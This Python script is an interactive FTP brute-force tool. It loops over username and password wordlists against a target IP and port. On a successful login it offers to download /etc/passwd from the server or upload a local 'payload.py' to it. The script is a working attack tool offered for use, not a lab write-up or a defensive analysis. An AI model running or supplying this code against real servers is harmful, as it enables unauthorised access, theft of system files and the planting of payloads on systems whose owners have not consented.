import ftplib
import time

# Main function definition.
def main():
    print("\nWelcome to FTP Brute Force!\n")
    # Main Menu loop. Connect or quit the program.
    while True:
        choice = input("Main Menu:\n"
                       "[1] Connect\n"
                       "[2] Quit\n"
                       "Enter your choice: ")

        if choice == "1":
            print("\n[+] Connecting to FTP server...\n")

            target = input("Enter the IP address: ")
            ftp = ftplib.FTP()
            port = input("Enter the port: ")
            # Select the file with potential logins or usernames.
            file_usernames = open("/home/skinnygoat/usernames.txt", "r+")
            # Select the file with potential passwords.
            file_passwords = open("/home/skinnygoat/passwords.txt", "r+")

            usernames = file_usernames.read().split("\n")
            passwords = file_passwords.read().split("\n")

            print("\nPlease be patient, this may take a while...\n")
            # Username loop.
            for username in usernames:
                # Password loop.
                for password in passwords:
                    time.sleep(0.2)
                    # Trying all combinations from your list.
                    try:
                        ftp.connect(target, int(port), timeout=4)
                        ftp.login(username, password)
                        print("[+] Successfully connected!\n"
                              f"\nusername: {username}\n"
                              f"password: {password}\n")
                        # After successful login, break the loop. New Menu where you can choose action.
                        while True:
                            choice = input("What do you want to do next:\n"
                                           "[1] Download the file\n"
                                           "[2] Send the file\n"
                                           "[3] Quit\n"
                                           "Enter your choice: ")

                            if choice == "1":
                                print(f"\n[+] Trying to download the file...\n")
                                # In my case it will be /etc/passwd. You can download whatever you want.
                                ftp.retrbinary("RETR /etc/passwd", open("/home/skinnygoat/passwd.txt", "wb").write)
                                print(f"[+] Successfully downloaded!\n")

                            elif choice == "2":
                                print(f"\n[+] Trying to send the file...\n")
                                # Send the file of your choice.
                                ftp.storbinary("STOR payload.py", open("/home/skinnygoat/payload.py", "rb"))
                                print(f"[+] Successfully sent!\n")

                            elif choice == "3":
                                print(f"\n[+] Quitting...\n")
                                break

                            else:
                                print(f"[-] Wrong choice! Try again!\n")

                        break
                    # List of all available error messages.
                    except ftplib.error_perm as error:
                        print(f"[-] Wrong credentials! Error: {error}\n")

                    except ftplib.error_reply as error:
                        print(f"[-] Wrong reply! Error: {error}\n")

                    except ftplib.error_temp as error:
                        print(f"[-] Temporary error! Error: {error}\n")

                    except ftplib.error_proto as error:
                        print(f"[-] Protocol error! Error: {error}\n")

                    except Exception as error:
                        print(f"[-] Unknown error! Error: {error}\n")

                else:
                    continue

                break
            # Closing the files.
            file_usernames.close()
            file_passwords.close()

        elif choice == "2":
            print("\n[+] Bye!\n")
            break

        else:
            print("\n[-] Invalid choice!\n")
            continue


if __name__ == "__main__":
    # Main function.
    main()
